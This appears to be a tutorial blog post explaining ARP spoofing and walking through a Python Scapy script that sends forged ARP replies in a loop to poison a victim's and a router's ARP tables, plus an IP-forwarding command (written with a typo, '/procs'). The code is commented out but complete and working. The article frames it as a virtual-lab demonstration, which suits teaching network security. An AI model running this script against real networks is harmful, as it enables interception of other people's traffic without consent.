---
title: "How to make a ARP Spoofing attack using Scapy  in python"
author: "mtnvdsk"
image: "thumbnail.jpg"
date: "2022-11-25"
---

In this article, we are going to discuss the ARP Spoofing attack using [Python](https://www.geeksforgeeks.org/python-programming-language/) programming. Before going deep into the code first let's understand some basic topics of what is ARP Spoofing and what it does.

### **ARP Spoofing:**

The ARP spoofing is the technique to fool a computer or a device which accepts the ARP response packets even though the device does not request it. As the device accepts the response packet without its knowledge, we can easily mess up with the hack and the hacker takes the advantage of this by sending a modified ARP response packet which contains the modified mac address of the client with the hacker ip address to the router to fool and then simultaneously send the same ARP response packet to the victim saying that I am router. To achieve this attack the hacker sends an ARP response packet to the victim saying that "I am the router with the mac-address (hacker machine address)"and at the same time the hacker sends the same ARP response packet to the router saying that "I am the victim with this mac-address (hacker machine mac-address). Due to ARP request the victim and router will modify their network tables with the respective mac-address provided by the hacker. This can be easily understood by the below figure.

![ARP Spoofing](https://media.geeksforgeeks.org/wp-content/uploads/20221105180856/before.png)

![After the attack the connection between the victim and the hacker](https://media.geeksforgeeks.org/wp-content/uploads/20221105181137/after.png)

## How to make a ARP Spoofing attack using Scapy Â in Python

Note: Here the attacks are performed under a virtual environment (virtual box) with Linux operating system as the hacker machine, Windows 10 as the victim machine and our home router as a router. This attack only works when all the devices are in the same network. Here, we are using NAT network to create this attack.

**Step 1:** To implement this code in Python we are going to use a package called scapy. First, we are going to create an ARP packet using the scapy package. Here, we are not creating an ARP request, but instead, we are creating an ARP response packet .so, we are going to let us know what are fields we need to set in order to make the ARP packet as a response packet in python as follows. In scapy the ARP packet is created using the syntax as shown below.

```{python}
#import scapy.all as scapy

#scapy.ARP()

# To list the fields in ARP()

#print(scapy.ls(scapy.ARP()))

```

**Output:** ![Output](https://media.geeksforgeeks.org/wp-content/uploads/20221014213947/scapyarppacketfields.png)

**Step 2:** Now let's understand the code by first getting the mac address of the device with it's ip address with the below code. First, we are using the above-mentioned scapy module to generate an ARP packet to the given IP address.

```{python}
# creating an ARP request to the ip address
#arp_request = scapy.ARP(pdst=ip)    

```

Then creating a broadcast message with mac address to broadcast mac that is "ff:ff:ff:ff:ff:ff" as shown below.

```{python}
# setting the denstination mac address to broadcast mac
#broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")   
```

Then we combine the broadcast packet with the ARP request.

```{python}
# combining the ARP packet with the broadcast message
#arp_request_broadcast = broadcast / arp_request
```

Then sent to the victim ip address and to do so we use scapy.srp() as shown below.

```{python}
#answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
```

Step 3: Now let's combine the mac address statements above-mentioned with in a function and then you them with our while loop to continuously fool the devices.

```{python}
#!/usr/bin/env python
# import time
# import sys
# import scapy.all as scapy
# # mac address function which will return
# # the mac_address of the provided ip address


# def get_mac(ip):
#     # creating an ARP request to the ip address
#     arp_request = scapy.ARP(pdst=ip)
#     # setting the denstination mac address to broadcast mac
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     # combining the ARP packet with the broadcast message
#     arp_request_broadcast = broadcast / arp_request
    
#     # return a list of mac addresses with respective
#     # mac addresses and ip addresses.
#     answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#     # we choose the first mac address and select
#     # the mac address using the field hwsrc
#     return answ[0][1].hwsrc


# def arp_spoof(target_ip, spoof_ip):
#     """" Here the ARP packet is set to response and
#     pdst is set to the target ip 
#     either it is for victim or router and the hwdst
#     is the mac address of the ip provided
#     and the psrc is the spoofing ip address
#     to manipulate the packet"""
    
#     packet = scapy.ARP(op=2, pdst=target_ip,
#                       hwdst=get_mac(target_ip), psrc=spoof_ip)
#     scapy.send(packet, verbose=False)


# victim_ip = input()  # taking the victim ip_address
# router_ip = input()  # taking the router ip address
# sent_packets_count = 0  # initializing the packet counter
# while True:
#     sent_packets_count += 2
#     arp_spoof(victim_ip, router_ip)
#     arp_spoof(router_ip, victim_ip)
#     print("[+] Packets sent " + str(sent_packets_count), end="\r")
#     sys.stdout.flush()
#     time.sleep(2)
```

![Output](https://media.geeksforgeeks.org/wp-content/uploads/20221014213947/outputconsole.png)

After implementing the program the victim does not get the internet connection because the packets are forwarded to hacker's machine and in order to allow the flow of packets we need to run a command in a Linux shell as below.

```{bash}
echo 1 > /procs/sys/net/ipv4/ip_forward
```

The victim ARP table is shown below: ![Output](https://media.geeksforgeeks.org/wp-content/uploads/20221014213948/windowsarptablechange.png)
